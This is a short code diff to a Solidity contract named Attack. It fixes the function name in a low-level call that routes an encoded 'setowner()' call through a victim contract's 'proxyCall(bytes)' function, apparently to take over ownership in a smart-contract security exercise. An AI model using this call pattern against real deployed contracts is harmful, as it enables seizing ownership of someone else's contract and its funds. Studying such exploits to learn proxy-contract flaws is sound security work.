@@ -34,7 +34,7 @@ contract Attack {
         // bytes memory data = ...
         (bool results, ) = victim.call(
             abi.encodeWithSignature(
-                "proxycall(bytes)",
+                "proxyCall(bytes)",
                 abi.encodeWithSignature("setowner()")
             )
         );
